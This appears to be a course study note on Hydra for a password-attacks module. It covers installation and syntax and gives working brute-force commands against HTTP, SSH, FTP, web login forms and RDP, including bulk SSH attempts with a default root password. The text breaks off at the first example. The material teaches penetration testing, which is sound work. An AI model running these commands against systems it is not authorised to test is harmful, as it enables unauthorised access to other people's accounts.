# NOTE — Hydra

## ID
513

## Module
Password Attacks

## Kind
notes

## Title
Section 6 — Hydra (Network Login Cracker)

## Description
Introduction to Hydra, a fast parallel network login cracker, covering installation, basic syntax, supported services, and real‑world brute‑forcing examples against HTTP, SSH, FTP, and RDP.

## Tags
hydra, brute-forcing, password-attacks, tool, network-cracker

## Commands
- `hydra -h`
- `sudo apt-get install hydra`
- `hydra -L usernames.txt -P passwords.txt www.example.com http-get`
- `hydra -l root -p toor -M targets.txt ssh`
- `hydra -L usernames.txt -P passwords.txt -s 2121 -V ftp.example.com ftp`
- `hydra -l admin -P passwords.txt www.example.com http-post-form "/login:user=^USER^&pass=^PASS^:S=302"`
- `hydra -l administrator -x 6:8:abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 192.168.1.100 rdp`

## What This Section Covers
Hydra is a high‑speed network login brute‑forcer supporting dozens of protocols (SSH, FTP, HTTP, RDP, MySQL, etc.). This section explains Hydra’s installation, command syntax, and common usage patterns. It provides practical examples for attacking HTTP basic auth, SSH servers in bulk, FTP on non‑standard ports, web login forms, and RDP with password generation rules.

## Methodology
1. **Install Hydra** — use `apt-get install hydra` if not already present.
2. **Understand the syntax** — `hydra [login_options] [password_options] [attack_options] [service://server]`
3. **Prepare wordlists** — usernames and passwords as text files (one per line).
4. **Choose the right service module** — `http-get`, `http-post-form`, `ssh`, `ftp`, `rdp`, etc.
5. **Run the attack** — adjust parallelism (`-t`), verbosity (`-V`), and stop conditions (`-f`) as needed.

## Multi-step Workflow (Examples)

### Example 1: HTTP Basic Authentication
```bash
hydra -L usernames.txt -P passwords.txt www.example.com http-get

<!-- AUTO-LINKS-START -->
---
**Module:** [[00-overview|login-brute-forcing]]  
← [[05-hybrid-attacks]] | [[07-basic-http-auth]] →
<!-- AUTO-LINKS-END -->
